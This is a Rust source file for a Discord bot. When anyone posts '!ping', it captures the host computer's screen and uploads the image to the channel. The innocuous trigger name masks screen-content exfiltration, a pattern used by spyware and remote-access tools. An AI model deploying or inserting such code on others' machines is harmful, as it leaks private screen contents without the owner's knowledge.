#![allow(non_snake_case)]

mod dowithsys;

use dowithsys::make_screenshot;
use serenity::all::{CreateAttachment, CreateMessage};
use serenity::async_trait;
use serenity::model::channel::Message;
use serenity::prelude::*;
use serde_json;
use serde::Deserialize;
use std::io::Cursor;

#[allow(dead_code)]
#[derive(Deserialize)]
struct Config {
    TOKEN: String,
}

#[allow(dead_code)]
fn config_reader() -> Config {
    let res = include_str!("config.json");
    let des: Config = serde_json::from_str(res).unwrap();
    return des;
}

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "!ping" {
            let cr = CreateAttachment::bytes(make_screenshot(), "screenshot.png");
            if let Err(why) = msg.channel_id.send_message(&ctx.http, CreateMessage::new().add_file(cr)).await {
                println!("Error sending message: {why:?}");
            }
        }
    }
}

#[tokio::main]
async fn main() {
    let token  = config_reader().TOKEN;
    
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client =
        Client::builder(&token, intents).event_handler(Handler).await.unwrap();

    // Start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("Error client started: {why:?}");
    }
}


